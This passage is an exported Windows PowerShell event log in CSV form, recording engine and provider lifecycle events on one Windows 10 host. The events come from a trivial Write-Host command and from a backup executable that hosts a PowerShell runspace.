+71,"Oct 25, 2022 @ 04:21:53.912",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,15,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.19041.1237
+	RunspaceId=e34ef109-ab82-4fde-915f-764d10c252d5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,5.1.19041.1237,-,-,e34ef109-ab82-4fde-915f-764d10c252d5,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,285,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+72,"Oct 25, 2022 @ 04:21:53.566",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,13,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.19041.1237
+	RunspaceId=e34ef109-ab82-4fde-915f-764d10c252d5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Available,None,5.1.19041.1237,5.1.19041.1237,-,-,e34ef109-ab82-4fde-915f-764d10c252d5,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,284,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+73,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,Registry,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,278,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+74,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,Alias,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,279,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+75,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,Environment,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,280,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+76,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,FileSystem,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,281,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+77,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,Function,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,282,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+78,"Oct 25, 2022 @ 04:21:53.550",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=a577b73f-ec81-4a98-a5ad-45ed20e047e8
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,5.1.19041.1237,Variable,Started,-,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",8,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,a577b73f-ec81-4a98-a5ad-45ed20e047e8,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,283,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+79,"Oct 25, 2022 @ 04:21:02.070",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=eb3a986f-b365-4c00-b60d-5a16fda224f2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,0.5.0.27,-,-,eb3a986f-b365-4c00-b60d-5a16fda224f2,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,277,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+80,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,FileSystem,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,271,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+81,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Function,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,272,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+82,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Variable,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,273,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+83,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Certificate,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,274,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+84,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,WSMan,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,275,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+85,"Oct 25, 2022 @ 04:21:01.303",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=eb3a986f-b365-4c00-b60d-5a16fda224f2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
